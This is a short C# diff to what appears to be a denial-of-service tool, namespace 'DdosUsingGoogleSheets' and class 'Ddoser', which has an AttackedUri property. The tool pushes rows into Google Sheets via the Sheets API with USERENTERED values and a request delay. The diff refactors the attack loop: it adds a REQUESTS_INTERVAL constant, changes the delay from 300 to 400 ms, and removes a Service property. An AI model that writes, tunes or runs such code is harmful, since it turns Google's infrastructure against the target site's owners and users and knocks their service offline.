@@ -11,6 +11,7 @@ namespace DdosUsingGoogleSheets
 {
     public class Ddoser
     {
+        const int REQUESTS_INTERVAL = 400;
         static readonly string[] Scopes = { SheetsService.Scope.Spreadsheets };
         readonly string _applicationName;
         readonly SheetsService _service;
@@ -24,8 +25,6 @@ namespace DdosUsingGoogleSheets
         public Uri AttackedUri { get => _attackedUri; set => _attackedUri = value; }
 
         public int Counter => _counter;
-
-        public SheetsService Service => _service;
 
         public Ddoser(string applicationName, string credentialsFileName)
         {
@@ -69,8 +68,8 @@ namespace DdosUsingGoogleSheets
 
                         body.Values.Add(data);
 
-                        await Task.Delay(300);
-                        var request = Service.Spreadsheets.Values.Update(body, sheetId, $"A{i}:Z{i}");
+                        await Task.Delay(REQUESTS_INTERVAL);
+                        var request = _service.Spreadsheets.Values.Update(body, sheetId, $"A{i}:Z{i}");
 
                         request.ValueInputOption = SpreadsheetsResource.ValuesResource.UpdateRequest.ValueInputOptionEnum.USERENTERED;
 
